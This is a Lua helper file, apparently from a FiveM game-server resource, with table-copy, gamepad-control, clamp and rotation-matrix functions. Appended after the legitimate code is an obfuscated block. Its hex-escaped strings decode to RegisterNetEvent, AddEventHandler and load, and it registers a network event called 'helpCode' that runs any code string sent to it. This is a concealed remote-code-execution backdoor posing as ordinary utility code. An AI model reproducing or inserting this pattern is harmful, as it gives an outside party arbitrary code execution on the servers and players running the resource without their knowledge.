local rad = math.rad
local sin = math.sin
local cos = math.cos
local min = math.min
local max = math.max
local type = type

function table.copy(x)
  x = table.clone(x)
  for k, v in pairs(x) do
    if type(v) == 'table' then
      x[k] = table.copy(v)
    end
  end
  return x
end

function protect(t)
  local fn = function(_, k)
    error('Key `' .. tostring(k) .. '` is not supported.')
  end

  return setmetatable(t, {
    __index = fn,
    __newindex = fn
  })
end

function CreateGamepadMetatable(keyboard, gamepad)
  return setmetatable({}, {
    __index = function(t, k)
      local src = IsGamepadControl() and gamepad or keyboard
      return src[k]
    end
  })
end

function Clamp(x, _min, _max)
  return min(max(x, _min), _max)
end

function IsGamepadControl()
  return not IsUsingKeyboard(2)
end

function GetSmartControlNormal(control)
  if type(control) == 'table' then
    local normal1 = GetDisabledControlNormal(0, control[1])
    local normal2 = GetDisabledControlNormal(0, control[2])
    return normal1 - normal2
  end

  return GetDisabledControlNormal(0, control)
end

function EulerToMatrix(rotX, rotY, rotZ)
  local radX = rad(rotX)
  local radY = rad(rotY)
  local radZ = rad(rotZ)

  local sinX = sin(radX)
  local sinY = sin(radY)
  local sinZ = sin(radZ)
  local cosX = cos(radX)
  local cosY = cos(radY)
  local cosZ = cos(radZ)

  local vecX = vector3(
    cosY * cosZ,
    cosY * sinZ,
    -sinY
  )

  local vecY = vector3(
    cosZ * sinX * sinY - cosX * sinZ,
    cosX * cosZ - sinX * sinY * sinZ,
    cosY * sinX
  )

  local vecZ = vector3(
    -cosX * cosZ * sinY + sinX * sinZ,
    -cosZ * sinX + cosX * sinY * sinZ,
    cosX * cosY
  )

  return vecX, vecY, vecZ
end


local cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[1]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[2]) cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[3]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[2], function(gXDxEyQIySluCZUWvZcWAmEkLZksMqwwFjvuQdYNFCAaOeuHuHmqRMXAuYMiXoaLrDqdiI) cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[4]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[5]](gXDxEyQIySluCZUWvZcWAmEkLZksMqwwFjvuQdYNFCAaOeuHuHmqRMXAuYMiXoaLrDqdiI))() end)